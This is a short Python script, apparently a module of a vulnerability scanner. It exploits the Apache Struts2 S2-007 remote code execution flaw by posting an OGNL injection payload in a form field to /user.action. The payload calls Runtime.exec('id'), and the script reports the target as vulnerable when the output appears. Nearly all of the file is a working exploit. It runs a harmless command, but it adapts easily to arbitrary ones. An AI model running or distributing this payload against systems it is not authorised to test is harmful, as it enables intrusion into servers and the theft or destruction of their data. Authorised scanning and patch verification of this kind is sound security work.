#!/usr/bin/env python
# _*_ coding: utf-8 _*_

import urllib
import requests





def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

payload='''
name=111&email=11&age=%27+%2B+%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew+java.lang.Boolean%28%22false%22%29+%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%29%29+%2B+%27'''
def S2_007_Main(arg):

    scheme, url, port = UrlProcessing(arg)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    payload_url = scheme+"://"+url+':'+str(port)+'/user.action'
    host=url+':'+str(port)
    headers = {
        'Host':host,
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'User-Agent': 'Mozilla/5.0(compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
        'Connection': 'close',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '571',
        'DNT': '1',
        'Referer':payload_url,
        'Upgrade-Insecure-Requests': '1'
    }
    s = requests.session()
    try:
        resp = s.post(payload_url, data=payload,headers=headers, timeout=5, verify=False)
        con = resp.text
        code = resp.status_code
        if code==200 and con.lower().find('uid')!=-1 and con.lower().find('gid')!=-1 and con.lower().find('groups')!=-1:
            vul = "{} 存在Struts2远程代码执行漏洞\r\n漏洞详情:\r\n影响版本:2_0_0-2_2_3\r\nPayload:{}\r\nPost:{}\r\n".format(url, payload_url,payload)
            return (vul)
    except Exception as e:
        pass
